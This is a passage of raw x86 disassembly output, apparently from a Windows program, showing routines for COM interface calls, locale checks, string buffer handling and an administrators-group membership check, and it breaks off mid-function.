  402375:	50                   	push   %eax
  402376:	56                   	push   %esi
  402377:	57                   	push   %edi
  402378:	ff 15 5c a3 41 00    	call   *0x41a35c
  40237e:	85 c0                	test   %eax,%eax
  402380:	0f 85 93 00 00 00    	jne    0x402419
  402386:	39 75 f4             	cmp    %esi,-0xc(%ebp)
  402389:	0f 84 8a 00 00 00    	je     0x402419
  40238f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402392:	50                   	push   %eax
  402393:	68 34 c4 41 00       	push   $0x41c434
  402398:	56                   	push   %esi
  402399:	56                   	push   %esi
  40239a:	ff 75 f4             	push   -0xc(%ebp)
  40239d:	ff 15 50 a2 41 00    	call   *0x41a250
  4023a3:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4023a6:	8b 08                	mov    (%eax),%ecx
  4023a8:	50                   	push   %eax
  4023a9:	ff 51 08             	call   *0x8(%ecx)
  4023ac:	57                   	push   %edi
  4023ad:	ff 15 50 a1 41 00    	call   *0x41a150
  4023b3:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4023b6:	3b c6                	cmp    %esi,%eax
  4023b8:	74 66                	je     0x402420
  4023ba:	8d 55 fc             	lea    -0x4(%ebp),%edx
  4023bd:	52                   	push   %edx
  4023be:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4023c1:	8b 08                	mov    (%eax),%ecx
  4023c3:	50                   	push   %eax
  4023c4:	ff 51 0c             	call   *0xc(%ecx)
  4023c7:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  4023ca:	74 3f                	je     0x40240b
  4023cc:	ff 75 fc             	push   -0x4(%ebp)
  4023cf:	e8 d4 fd ff ff       	call   0x4021a8
  4023d4:	59                   	pop    %ecx
  4023d5:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4023d8:	51                   	push   %ecx
  4023d9:	6a 18                	push   $0x18
  4023db:	50                   	push   %eax
  4023dc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4023df:	ff 15 40 a0 41 00    	call   *0x41a040
  4023e5:	6a 06                	push   $0x6
  4023e7:	ff 75 e0             	push   -0x20(%ebp)
  4023ea:	ff 75 dc             	push   -0x24(%ebp)
  4023ed:	56                   	push   %esi
  4023ee:	56                   	push   %esi
  4023ef:	56                   	push   %esi
  4023f0:	ff 75 08             	push   0x8(%ebp)
  4023f3:	ff 15 84 a2 41 00    	call   *0x41a284
  4023f9:	ff 75 fc             	push   -0x4(%ebp)
  4023fc:	56                   	push   %esi
  4023fd:	68 72 01 00 00       	push   $0x172
  402402:	ff 75 08             	push   0x8(%ebp)
  402405:	ff 15 b8 a2 41 00    	call   *0x41a2b8
  40240b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40240e:	8b 08                	mov    (%eax),%ecx
  402410:	50                   	push   %eax
  402411:	ff 51 08             	call   *0x8(%ecx)
  402414:	33 c0                	xor    %eax,%eax
  402416:	40                   	inc    %eax
  402417:	eb 09                	jmp    0x402422
  402419:	57                   	push   %edi
  40241a:	ff 15 50 a1 41 00    	call   *0x41a150
  402420:	33 c0                	xor    %eax,%eax
  402422:	5f                   	pop    %edi
  402423:	5e                   	pop    %esi
  402424:	5b                   	pop    %ebx
  402425:	c9                   	leave
  402426:	c3                   	ret
  402427:	66 83 3d 80 e9 41 00 	cmpw   $0x0,0x41e980
  40242e:	00 
  40242f:	75 44                	jne    0x402475
  402431:	ff 15 3c a1 41 00    	call   *0x41a13c
  402437:	66 a3 80 e9 41 00    	mov    %ax,0x41e980
  40243d:	8b 0d 80 e9 41 00    	mov    0x41e980,%ecx
  402443:	66 81 e1 ff 03       	and    $0x3ff,%cx
  402448:	66 83 f9 09          	cmp    $0x9,%cx
  40244c:	74 04                	je     0x402452
  40244e:	0f b7 c0             	movzwl %ax,%eax
  402451:	c3                   	ret
  402452:	ff 15 40 a1 41 00    	call   *0x41a140
  402458:	66 3d 09 04          	cmp    $0x409,%ax
  40245c:	75 17                	jne    0x402475
  40245e:	ff 15 44 a1 41 00    	call   *0x41a144
  402464:	8b 0d 10 b4 41 00    	mov    0x41b410,%ecx
  40246a:	3b c1                	cmp    %ecx,%eax
  40246c:	75 07                	jne    0x402475
  40246e:	66 89 0d 80 e9 41 00 	mov    %cx,0x41e980
  402475:	0f b7 05 80 e9 41 00 	movzwl 0x41e980,%eax
  40247c:	c3                   	ret
  40247d:	55                   	push   %ebp
  40247e:	8b ec                	mov    %esp,%ebp
  402480:	81 ec a8 00 00 00    	sub    $0xa8,%esp
  402486:	53                   	push   %ebx
  402487:	56                   	push   %esi
  402488:	33 db                	xor    %ebx,%ebx
  40248a:	33 f6                	xor    %esi,%esi
  40248c:	39 1d b0 e0 41 00    	cmp    %ebx,0x41e0b0
  402492:	74 1c                	je     0x4024b0
  402494:	b8 b0 e0 41 00       	mov    $0x41e0b0,%eax
  402499:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40249c:	39 08                	cmp    %ecx,(%eax)
  40249e:	74 10                	je     0x4024b0
  4024a0:	46                   	inc    %esi
  4024a1:	8b c6                	mov    %esi,%eax
  4024a3:	c1 e0 04             	shl    $0x4,%eax
  4024a6:	8d 80 b0 e0 41 00    	lea    0x41e0b0(%eax),%eax
  4024ac:	39 18                	cmp    %ebx,(%eax)
  4024ae:	75 e9                	jne    0x402499
  4024b0:	c1 e6 04             	shl    $0x4,%esi
  4024b3:	39 9e b0 e0 41 00    	cmp    %ebx,0x41e0b0(%esi)
  4024b9:	75 0a                	jne    0x4024c5
  4024bb:	b8 84 a5 41 00       	mov    $0x41a584,%eax
  4024c0:	e9 72 01 00 00       	jmp    0x402637
  4024c5:	57                   	push   %edi
  4024c6:	8b 3d 98 a1 41 00    	mov    0x41a198,%edi
  4024cc:	ff d7                	call   *%edi
  4024ce:	ff 75 08             	push   0x8(%ebp)
  4024d1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4024d4:	8d 45 98             	lea    -0x68(%ebp),%eax
  4024d7:	68 00 a6 41 00       	push   $0x41a600
  4024dc:	50                   	push   %eax
  4024dd:	ff 15 c0 a2 41 00    	call   *0x41a2c0
  4024e3:	83 c4 0c             	add    $0xc,%esp
  4024e6:	53                   	push   %ebx
  4024e7:	53                   	push   %ebx
  4024e8:	8b 1d 28 a1 41 00    	mov    0x41a128,%ebx
  4024ee:	8d 45 98             	lea    -0x68(%ebp),%eax
  4024f1:	50                   	push   %eax
  4024f2:	ff d3                	call   *%ebx
  4024f4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4024f7:	ff d7                	call   *%edi
  4024f9:	85 c0                	test   %eax,%eax
  4024fb:	75 78                	jne    0x402575
  4024fd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402500:	33 c9                	xor    %ecx,%ecx
  402502:	6a 02                	push   $0x2
  402504:	83 c0 02             	add    $0x2,%eax
  402507:	5a                   	pop    %edx
  402508:	f7 e2                	mul    %edx
  40250a:	0f 90 c1             	seto   %cl
  40250d:	f7 d9                	neg    %ecx
  40250f:	0b c8                	or     %eax,%ecx
  402511:	51                   	push   %ecx
  402512:	e8 59 6d 01 00       	call   0x419270
  402517:	59                   	pop    %ecx
  402518:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40251b:	41                   	inc    %ecx
  40251c:	51                   	push   %ecx
  40251d:	50                   	push   %eax
  40251e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402521:	8d 45 98             	lea    -0x68(%ebp),%eax
  402524:	50                   	push   %eax
  402525:	ff d3                	call   *%ebx
  402527:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  40252a:	77 40                	ja     0x40256c
  40252c:	ff d7                	call   *%edi
  40252e:	85 c0                	test   %eax,%eax
  402530:	75 3a                	jne    0x40256c
  402532:	8b 86 bc e0 41 00    	mov    0x41e0bc(%esi),%eax
  402538:	85 c0                	test   %eax,%eax
  40253a:	74 25                	je     0x402561
  40253c:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40253f:	57                   	push   %edi
  402540:	50                   	push   %eax
  402541:	ff 15 2c a1 41 00    	call   *0x41a12c
  402547:	85 c0                	test   %eax,%eax
  402549:	74 13                	je     0x40255e
  40254b:	ff b6 bc e0 41 00    	push   0x41e0bc(%esi)
  402551:	e8 14 6d 01 00       	call   0x41926a
  402556:	89 be bc e0 41 00    	mov    %edi,0x41e0bc(%esi)
  40255c:	eb 16                	jmp    0x402574
  40255e:	57                   	push   %edi
  40255f:	eb 0e                	jmp    0x40256f
  402561:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402564:	89 86 bc e0 41 00    	mov    %eax,0x41e0bc(%esi)
  40256a:	eb 09                	jmp    0x402575
  40256c:	ff 75 f8             	push   -0x8(%ebp)
  40256f:	e8 f6 6c 01 00       	call   0x41926a
  402574:	59                   	pop    %ecx
  402575:	ff 75 f4             	push   -0xc(%ebp)
  402578:	ff 15 84 a1 41 00    	call   *0x41a184
  40257e:	8b 86 bc e0 41 00    	mov    0x41e0bc(%esi),%eax
  402584:	85 c0                	test   %eax,%eax
  402586:	0f 85 aa 00 00 00    	jne    0x402636
  40258c:	8b 9e b4 e0 41 00    	mov    0x41e0b4(%esi),%ebx
  402592:	8d be b8 e0 41 00    	lea    0x41e0b8(%esi),%edi
  402598:	39 07                	cmp    %eax,(%edi)
  40259a:	74 0f                	je     0x4025ab
  40259c:	e8 86 fe ff ff       	call   0x402427
  4025a1:	3b 05 10 b4 41 00    	cmp    0x41b410,%eax
  4025a7:	75 02                	jne    0x4025ab
  4025a9:	8b 1f                	mov    (%edi),%ebx
  4025ab:	53                   	push   %ebx
  4025ac:	ff 15 30 a1 41 00    	call   *0x41a130
  4025b2:	8b f8                	mov    %eax,%edi
  4025b4:	47                   	inc    %edi
  4025b5:	33 c9                	xor    %ecx,%ecx
  4025b7:	6a 02                	push   $0x2
  4025b9:	5a                   	pop    %edx
  4025ba:	8d 47 02             	lea    0x2(%edi),%eax
  4025bd:	f7 e2                	mul    %edx
  4025bf:	0f 90 c1             	seto   %cl
  4025c2:	f7 d9                	neg    %ecx
  4025c4:	0b c8                	or     %eax,%ecx
  4025c6:	51                   	push   %ecx
  4025c7:	e8 a4 6c 01 00       	call   0x419270
  4025cc:	83 3d 84 e0 41 00 ff 	cmpl   $0xffffffff,0x41e084
  4025d3:	59                   	pop    %ecx
  4025d4:	89 86 bc e0 41 00    	mov    %eax,0x41e0bc(%esi)
  4025da:	75 3a                	jne    0x402616
  4025dc:	83 25 84 e0 41 00 00 	andl   $0x0,0x41e084
  4025e3:	6a 1f                	push   $0x1f
  4025e5:	8d 85 58 ff ff ff    	lea    -0xa8(%ebp),%eax
  4025eb:	50                   	push   %eax
  4025ec:	0f b7 05 80 e9 41 00 	movzwl 0x41e980,%eax
  4025f3:	68 04 10 00 00       	push   $0x1004
  4025f8:	50                   	push   %eax
  4025f9:	ff 15 34 a1 41 00    	call   *0x41a134
  4025ff:	85 c0                	test   %eax,%eax
  402601:	7e 13                	jle    0x402616
  402603:	8d 85 58 ff ff ff    	lea    -0xa8(%ebp),%eax
  402609:	50                   	push   %eax
  40260a:	ff 15 d4 a1 41 00    	call   *0x41a1d4
  402610:	59                   	pop    %ecx
  402611:	a3 84 e0 41 00       	mov    %eax,0x41e084
  402616:	8d 47 01             	lea    0x1(%edi),%eax
  402619:	50                   	push   %eax
  40261a:	ff b6 bc e0 41 00    	push   0x41e0bc(%esi)
  402620:	57                   	push   %edi
  402621:	53                   	push   %ebx
  402622:	6a 00                	push   $0x0
  402624:	ff 35 84 e0 41 00    	push   0x41e084
  40262a:	ff 15 38 a1 41 00    	call   *0x41a138
  402630:	8b 86 bc e0 41 00    	mov    0x41e0bc(%esi),%eax
  402636:	5f                   	pop    %edi
  402637:	5e                   	pop    %esi
  402638:	5b                   	pop    %ebx
  402639:	c9                   	leave
  40263a:	c3                   	ret
  40263b:	83 3d b0 e0 41 00 00 	cmpl   $0x0,0x41e0b0
  402642:	74 20                	je     0x402664
  402644:	56                   	push   %esi
  402645:	be bc e0 41 00       	mov    $0x41e0bc,%esi
  40264a:	8b 06                	mov    (%esi),%eax
  40264c:	85 c0                	test   %eax,%eax
  40264e:	74 0a                	je     0x40265a
  402650:	50                   	push   %eax
  402651:	e8 14 6c 01 00       	call   0x41926a
  402656:	83 26 00             	andl   $0x0,(%esi)
  402659:	59                   	pop    %ecx
  40265a:	83 c6 10             	add    $0x10,%esi
  40265d:	83 7e f4 00          	cmpl   $0x0,-0xc(%esi)
  402661:	75 e7                	jne    0x40264a
  402663:	5e                   	pop    %esi
  402664:	c3                   	ret
  402665:	55                   	push   %ebp
  402666:	8b ec                	mov    %esp,%ebp
  402668:	83 ec 24             	sub    $0x24,%esp
  40266b:	68 1c a6 41 00       	push   $0x41a61c
  402670:	68 c4 a5 41 00       	push   $0x41a5c4
  402675:	ff 15 68 a1 41 00    	call   *0x41a168
  40267b:	50                   	push   %eax
  40267c:	ff 15 6c a1 41 00    	call   *0x41a16c
  402682:	85 c0                	test   %eax,%eax
  402684:	74 0c                	je     0x402692
  402686:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  402689:	51                   	push   %ecx
  40268a:	ff d0                	call   *%eax
  40268c:	0f b7 45 dc          	movzwl -0x24(%ebp),%eax
  402690:	c9                   	leave
  402691:	c3                   	ret
  402692:	33 c0                	xor    %eax,%eax
  402694:	c9                   	leave
  402695:	c3                   	ret
  402696:	e8 ca ff ff ff       	call   0x402665
  40269b:	83 f8 09             	cmp    $0x9,%eax
  40269e:	b8 38 a6 41 00       	mov    $0x41a638,%eax
  4026a3:	75 05                	jne    0x4026aa
  4026a5:	b8 30 a6 41 00       	mov    $0x41a630,%eax
  4026aa:	c3                   	ret
  4026ab:	83 3d 84 e9 41 00 00 	cmpl   $0x0,0x41e984
  4026b2:	74 2a                	je     0x4026de
  4026b4:	68 40 a6 41 00       	push   $0x41a640
  4026b9:	68 c4 a5 41 00       	push   $0x41a5c4
  4026be:	ff 15 68 a1 41 00    	call   *0x41a168
  4026c4:	50                   	push   %eax
  4026c5:	ff 15 6c a1 41 00    	call   *0x41a16c
  4026cb:	85 c0                	test   %eax,%eax
  4026cd:	74 0f                	je     0x4026de
  4026cf:	ff 35 88 e9 41 00    	push   0x41e988
  4026d5:	ff d0                	call   *%eax
  4026d7:	83 25 84 e9 41 00 00 	andl   $0x0,0x41e984
  4026de:	c3                   	ret
  4026df:	83 25 84 e9 41 00 00 	andl   $0x0,0x41e984
  4026e6:	68 60 a6 41 00       	push   $0x41a660
  4026eb:	68 c4 a5 41 00       	push   $0x41a5c4
  4026f0:	ff 15 68 a1 41 00    	call   *0x41a168
  4026f6:	50                   	push   %eax
  4026f7:	ff 15 6c a1 41 00    	call   *0x41a16c
  4026fd:	85 c0                	test   %eax,%eax
  4026ff:	74 11                	je     0x402712
  402701:	68 88 e9 41 00       	push   $0x41e988
  402706:	ff d0                	call   *%eax
  402708:	c7 05 84 e9 41 00 01 	movl   $0x1,0x41e984
  40270f:	00 00 00 
  402712:	c3                   	ret
  402713:	56                   	push   %esi
  402714:	8b 74 24 08          	mov    0x8(%esp),%esi
  402718:	85 f6                	test   %esi,%esi
  40271a:	75 05                	jne    0x402721
  40271c:	33 c0                	xor    %eax,%eax
  40271e:	40                   	inc    %eax
  40271f:	5e                   	pop    %esi
  402720:	c3                   	ret
  402721:	e8 3f ff ff ff       	call   0x402665
  402726:	83 f8 09             	cmp    $0x9,%eax
  402729:	75 0c                	jne    0x402737
  40272b:	83 fe 02             	cmp    $0x2,%esi
  40272e:	75 10                	jne    0x402740
  402730:	e8 aa ff ff ff       	call   0x4026df
  402735:	eb e5                	jmp    0x40271c
  402737:	85 c0                	test   %eax,%eax
  402739:	75 05                	jne    0x402740
  40273b:	40                   	inc    %eax
  40273c:	3b f0                	cmp    %eax,%esi
  40273e:	74 02                	je     0x402742
  402740:	33 c0                	xor    %eax,%eax
  402742:	5e                   	pop    %esi
  402743:	c3                   	ret
  402744:	55                   	push   %ebp
  402745:	8b ec                	mov    %esp,%ebp
  402747:	83 ec 10             	sub    $0x10,%esp
  40274a:	53                   	push   %ebx
  40274b:	33 db                	xor    %ebx,%ebx
  40274d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402750:	50                   	push   %eax
  402751:	53                   	push   %ebx
  402752:	53                   	push   %ebx
  402753:	53                   	push   %ebx
  402754:	53                   	push   %ebx
  402755:	53                   	push   %ebx
  402756:	53                   	push   %ebx
  402757:	68 20 02 00 00       	push   $0x220
  40275c:	6a 20                	push   $0x20
  40275e:	6a 02                	push   $0x2
  402760:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402763:	50                   	push   %eax
  402764:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402767:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40276a:	88 5d f0             	mov    %bl,-0x10(%ebp)
  40276d:	88 5d f1             	mov    %bl,-0xf(%ebp)
  402770:	88 5d f2             	mov    %bl,-0xe(%ebp)
  402773:	88 5d f3             	mov    %bl,-0xd(%ebp)
  402776:	88 5d f4             	mov    %bl,-0xc(%ebp)
  402779:	c6 45 f5 05          	movb   $0x5,-0xb(%ebp)
  40277d:	ff 15 04 a0 41 00    	call   *0x41a004
  402783:	85 c0                	test   %eax,%eax
  402785:	74 1a                	je     0x4027a1
  402787:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40278a:	50                   	push   %eax
  40278b:	ff 75 fc             	push   -0x4(%ebp)
  40278e:	53                   	push   %ebx
  40278f:	ff 15 08 a0 41 00    	call   *0x41a008
  402795:	ff 75 fc             	push   -0x4(%ebp)
  402798:	ff 15 00 a0 41 00    	call   *0x41a000
  40279e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4027a1:	5b                   	pop    %ebx
  4027a2:	c9                   	leave
  4027a3:	c3                   	ret
  4027a4:	55                   	push   %ebp
  4027a5:	8b ec                	mov    %esp,%ebp
  4027a7:	8b 45 08             	mov    0x8(%ebp),%eax
  4027aa:	56                   	push   %esi
  4027ab:	8b 70 04             	mov    0x4(%eax),%esi
  4027ae:	85 f6                	test   %esi,%esi
  4027b0:	8b 45 0c             	mov    0xc(%ebp),%eax
  4027b3:	74 4b                	je     0x402800
  4027b5:	8b 51 04             	mov    0x4(%ecx),%edx
  4027b8:	3b c2                	cmp    %edx,%eax
  4027ba:	53                   	push   %ebx
  4027bb:	57                   	push   %edi
  4027bc:	7d 3d                	jge    0x4027fb
  4027be:	33 d2                	xor    %edx,%edx
  4027c0:	85 f6                	test   %esi,%esi
  4027c2:	7e 27                	jle    0x4027eb
  4027c4:	8d 34 00             	lea    (%eax,%eax,1),%esi
  4027c7:	8d 3c 02             	lea    (%edx,%eax,1),%edi
  4027ca:	3b 79 04             	cmp    0x4(%ecx),%edi
  4027cd:	7d 1c                	jge    0x4027eb
  4027cf:	8b 7d 08             	mov    0x8(%ebp),%edi
  4027d2:	8b 19                	mov    (%ecx),%ebx
  4027d4:	8b 3f                	mov    (%edi),%edi
  4027d6:	66 8b 1c 1e          	mov    (%esi,%ebx,1),%bx
  4027da:	66 3b 1c 57          	cmp    (%edi,%edx,2),%bx
  4027de:	75 0b                	jne    0x4027eb
  4027e0:	8b 7d 08             	mov    0x8(%ebp),%edi
  4027e3:	42                   	inc    %edx
  4027e4:	46                   	inc    %esi
  4027e5:	46                   	inc    %esi
  4027e6:	3b 57 04             	cmp    0x4(%edi),%edx
  4027e9:	7c dc                	jl     0x4027c7
  4027eb:	8b 75 08             	mov    0x8(%ebp),%esi
  4027ee:	8b 76 04             	mov    0x4(%esi),%esi
  4027f1:	3b d6                	cmp    %esi,%edx
  4027f3:	74 09                	je     0x4027fe
  4027f5:	40                   	inc    %eax
  4027f6:	3b 41 04             	cmp    0x4(%ecx),%eax
  4027f9:	7c c3                	jl     0x4027be
  4027fb:	83 c8 ff             	or     $0xffffffff,%eax
  4027fe:	5f                   	pop    %edi
  4027ff:	5b                   	pop    %ebx
  402800:	5e                   	pop    %esi
  402801:	5d                   	pop    %ebp
  402802:	c2 08 00             	ret    $0x8
  402805:	53                   	push   %ebx
  402806:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  40280a:	56                   	push   %esi
  40280b:	8b f1                	mov    %ecx,%esi
  40280d:	43                   	inc    %ebx
  40280e:	3b 5e 08             	cmp    0x8(%esi),%ebx
  402811:	74 39                	je     0x40284c
  402813:	57                   	push   %edi
  402814:	53                   	push   %ebx
  402815:	e8 56 6a 01 00       	call   0x419270
  40281a:	8b f8                	mov    %eax,%edi
  40281c:	33 c0                	xor    %eax,%eax
  40281e:	39 46 08             	cmp    %eax,0x8(%esi)
  402821:	59                   	pop    %ecx
  402822:	7e 1b                	jle    0x40283f
  402824:	39 46 04             	cmp    %eax,0x4(%esi)
  402827:	7e 0e                	jle    0x402837
  402829:	8b 0e                	mov    (%esi),%ecx
  40282b:	8a 0c 08             	mov    (%eax,%ecx,1),%cl
  40282e:	88 0c 38             	mov    %cl,(%eax,%edi,1)
  402831:	40                   	inc    %eax
  402832:	3b 46 04             	cmp    0x4(%esi),%eax
  402835:	7c f2                	jl     0x402829
  402837:	ff 36                	push   (%esi)
  402839:	e8 2c 6a 01 00       	call   0x41926a
  40283e:	59                   	pop    %ecx
  40283f:	8b 46 04             	mov    0x4(%esi),%eax
  402842:	89 3e                	mov    %edi,(%esi)
  402844:	c6 04 07 00          	movb   $0x0,(%edi,%eax,1)
  402848:	89 5e 08             	mov    %ebx,0x8(%esi)
  40284b:	5f                   	pop    %edi
  40284c:	5e                   	pop    %esi
  40284d:	5b                   	pop    %ebx
  40284e:	c2 04 00             	ret    $0x4
  402851:	53                   	push   %ebx
  402852:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  402856:	56                   	push   %esi
  402857:	57                   	push   %edi
  402858:	8b 79 08             	mov    0x8(%ecx),%edi
  40285b:	8b f7                	mov    %edi,%esi
  40285d:	2b 71 04             	sub    0x4(%ecx),%esi
  402860:	4e                   	dec    %esi
  402861:	3b de                	cmp    %esi,%ebx
  402863:	7e 30                	jle    0x402895
  402865:	83 ff 40             	cmp    $0x40,%edi
  402868:	7e 09                	jle    0x402873
  40286a:	8b c7                	mov    %edi,%eax
  40286c:	99                   	cltd
  40286d:	2b c2                	sub    %edx,%eax
  40286f:	d1 f8                	sar    $1,%eax
  402871:	eb 0f                	jmp    0x402882
  402873:	33 c0                	xor    %eax,%eax
  402875:	83 ff 08             	cmp    $0x8,%edi
  402878:	0f 9e c0             	setle  %al
  40287b:	48                   	dec    %eax
  40287c:	83 e0 0c             	and    $0xc,%eax
  40287f:	83 c0 04             	add    $0x4,%eax
  402882:	8d 14 30             	lea    (%eax,%esi,1),%edx
  402885:	3b d3                	cmp    %ebx,%edx
  402887:	7d 04                	jge    0x40288d
  402889:	2b de                	sub    %esi,%ebx
  40288b:	8b c3                	mov    %ebx,%eax
  40288d:	03 f8                	add    %eax,%edi
  40288f:	57                   	push   %edi
  402890:	e8 70 ff ff ff       	call   0x402805
  402895:	5f                   	pop    %edi
  402896:	5e                   	pop    %esi
  402897:	5b                   	pop    %ebx
  402898:	c2 04 00             	ret    $0x4
  40289b:	8b 01                	mov    (%ecx),%eax
  40289d:	8b 51 04             	mov    0x4(%ecx),%edx
  4028a0:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4028a4:	2b d1                	sub    %ecx,%edx
  4028a6:	8d 54 12 02          	lea    0x2(%edx,%edx,1),%edx
  4028aa:	8d 0c 48             	lea    (%eax,%ecx,2),%ecx
  4028ad:	52                   	push   %edx
  4028ae:	51                   	push   %ecx
  4028af:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4028b3:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  4028b6:	50                   	push   %eax
  4028b7:	ff 15 3c a2 41 00    	call   *0x41a23c
  4028bd:	83 c4 0c             	add    $0xc,%esp
  4028c0:	c2 08 00             	ret    $0x8
  4028c3:	53                   	push   %ebx
  4028c4:	56                   	push   %esi
  4028c5:	57                   	push   %edi
  4028c6:	eb 3b                	jmp    0x402903
  4028c8:	8b 02                	mov    (%edx),%eax
  4028ca:	8b 39                	mov    (%ecx),%edi
  4028cc:	8a 1c 07             	mov    (%edi,%eax,1),%bl
  4028cf:	8a c3                	mov    %bl,%al
  4028d1:	e8 db f5 ff ff       	call   0x401eb1
  4028d6:	84 c0                	test   %al,%al
  4028d8:	75 27                	jne    0x402901
  4028da:	80 fb 3b             	cmp    $0x3b,%bl
  4028dd:	75 2d                	jne    0x40290c
  4028df:	3b fe                	cmp    %esi,%edi
  4028e1:	7d 12                	jge    0x4028f5
  4028e3:	8b 01                	mov    (%ecx),%eax
  4028e5:	8b 32                	mov    (%edx),%esi
  4028e7:	80 3c 30 0a          	cmpb   $0xa,(%eax,%esi,1)
  4028eb:	74 0e                	je     0x4028fb
  4028ed:	40                   	inc    %eax
  4028ee:	89 01                	mov    %eax,(%ecx)
  4028f0:	3b 42 04             	cmp    0x4(%edx),%eax
  4028f3:	7c ee                	jl     0x4028e3
  4028f5:	32 c0                	xor    %al,%al
  4028f7:	5f                   	pop    %edi
  4028f8:	5e                   	pop    %esi
  4028f9:	5b                   	pop    %ebx
  4028fa:	c3                   	ret
  4028fb:	ff 05 80 e0 41 00    	incl   0x41e080
  402901:	ff 01                	incl   (%ecx)
  402903:	8b 72 04             	mov    0x4(%edx),%esi
  402906:	39 31                	cmp    %esi,(%ecx)
  402908:	7c be                	jl     0x4028c8
  40290a:	eb e9                	jmp    0x4028f5
  40290c:	b0 01                	mov    $0x1,%al
  40290e:	eb e7                	jmp    0x4028f7
  402910:	53                   	push   %ebx
  402911:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  402915:	85 db                	test   %ebx,%ebx
  402917:	56                   	push   %esi
  402918:	57                   	push   %edi
  402919:	75 04                	jne    0x40291f
  40291b:	33 f6                	xor    %esi,%esi
  40291d:	eb 02                	jmp    0x402921
  40291f:	8b 33                	mov    (%ebx),%esi
  402921:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402925:	eb 18                	jmp    0x40293f
  402927:	8b 47 0c             	mov    0xc(%edi),%eax
  40292a:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  40292d:	ff 74 24 14          	push   0x14(%esp)
  402931:	8b 00                	mov    (%eax),%eax
  402933:	50                   	push   %eax
  402934:	ff 15 24 a1 41 00    	call   *0x41a124
  40293a:	85 c0                	test   %eax,%eax
  40293c:	74 0c                	je     0x40294a
  40293e:	46                   	inc    %esi
  40293f:	3b 77 08             	cmp    0x8(%edi),%esi
  402942:	7c e3                	jl     0x402927
  402944:	33 c0                	xor    %eax,%eax
  402946:	5f                   	pop    %edi
  402947:	5e                   	pop    %esi
  402948:	5b                   	pop    %ebx
  402949:	c3                   	ret
  40294a:	85 db                	test   %ebx,%ebx
  40294c:	74 02                	je     0x402950
  40294e:	89 33                	mov    %esi,(%ebx)
  402950:	8b 47 0c             	mov    0xc(%edi),%eax
  402953:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  402956:	eb ee                	jmp    0x402946
  402958:	56                   	push   %esi
  402959:	8b 74 24 08          	mov    0x8(%esp),%esi
  40295d:	57                   	push   %edi
  40295e:	33 ff                	xor    %edi,%edi
  402960:	39 7e 08             	cmp    %edi,0x8(%esi)
  402963:	7e 28                	jle    0x40298d
  402965:	8b 46 0c             	mov    0xc(%esi),%eax
  402968:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  40296b:	ff 74 24 10          	push   0x10(%esp)
  40296f:	8b 00                	mov    (%eax),%eax
  402971:	50                   	push   %eax
  402972:	ff 15 24 a1 41 00    	call   *0x41a124
  402978:	85 c0                	test   %eax,%eax
  40297a:	75 0b                	jne    0x402987
  40297c:	8b 06                	mov    (%esi),%eax
  40297e:	6a 01                	push   $0x1
  402980:	57                   	push   %edi
  402981:	8b ce                	mov    %esi,%ecx
  402983:	ff 50 04             	call   *0x4(%eax)
  402986:	4f                   	dec    %edi
  402987:	47                   	inc    %edi
  402988:	3b 7e 08             	cmp    0x8(%esi),%edi
  40298b:	7c d8                	jl     0x402965
  40298d:	5f                   	pop    %edi
  40298e:	5e                   	pop    %esi
  40298f:	c3                   	ret
  402990:	56                   	push   %esi
  402991:	8b f1                	mov    %ecx,%esi
  402993:	ff 76 0c             	push   0xc(%esi)
  402996:	e8 cf 68 01 00       	call   0x41926a
  40299b:	ff 36                	push   (%esi)
  40299d:	e8 c8 68 01 00       	call   0x41926a
  4029a2:	59                   	pop    %ecx
  4029a3:	59                   	pop    %ecx
  4029a4:	5e                   	pop    %esi
  4029a5:	c3                   	ret
  4029a6:	ff 74 24 0c          	push   0xc(%esp)
  4029aa:	ff 74 24 0c          	push   0xc(%esp)
  4029ae:	ff 74 24 0c          	push   0xc(%esp)
  4029b2:	e8 59 ff ff ff       	call   0x402910
  4029b7:	83 c4 0c             	add    $0xc,%esp
  4029ba:	85 c0                	test   %eax,%eax
  4029bc:	74 04                	je     0x4029c2
  4029be:	8b 40 0c             	mov    0xc(%eax),%eax
  4029c1:	c3                   	ret
  4029c2:	33 c0                	xor    %eax,%eax
  4029c4:	c3                   	ret
  4029c5:	55                   	push   %ebp
  4029c6:	8b ec                	mov    %esp,%ebp
  4029c8:	83 ec 40             	sub    $0x40,%esp
  4029cb:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4029cf:	75 04                	jne    0x4029d5
  4029d1:	33 c0                	xor    %eax,%eax
  4029d3:	c9                   	leave
  4029d4:	c3                   	ret
  4029d5:	f6 05 c8 e9 41 00 02 	testb  $0x2,0x41e9c8
  4029dc:	c7 45 c0 40 00 00 00 	movl   $0x40,-0x40(%ebp)
  4029e3:	75 45                	jne    0x402a2a
  4029e5:	8d 45 c0             	lea    -0x40(%ebp),%eax
